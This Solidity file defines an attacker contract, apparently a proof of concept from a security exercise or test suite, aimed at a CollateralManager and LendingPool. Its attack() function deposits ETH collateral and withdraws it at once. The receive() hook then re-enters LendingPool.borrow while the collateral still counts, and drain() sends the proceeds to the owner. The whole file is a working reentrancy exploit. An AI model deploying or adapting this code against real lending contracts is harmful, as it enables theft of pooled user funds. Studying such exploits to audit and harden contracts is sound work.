// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CollateralManager} from "./CollateralManager.sol";
import {LendingPool} from "./LendingPool.sol";

contract PoolAttacker {
    CollateralManager public immutable collateralManager;
    LendingPool public immutable lendingPool;

    address public owner;
    bool private _attackDone;

    uint256 public borrowAmount;

    constructor(address payable _collateralManager, address payable _lendingPool) {
        collateralManager = CollateralManager(_collateralManager);
        lendingPool = LendingPool(_lendingPool);
        owner = msg.sender;
    }

    function attack(uint256 _borrowAmount) external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value > 0, "zero attack value");

        borrowAmount = _borrowAmount;
        _attackDone = false;

        collateralManager.depositCollateral{value: msg.value}();
        
        collateralManager.withdrawCollateral(msg.value);
    }

    receive() external payable {
        if(_attackDone) {
            return;
        }

        _attackDone = true;
        lendingPool.borrow(borrowAmount);
    }

    function drain() external {
        require(msg.sender == owner, "Not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok);
    }
   
}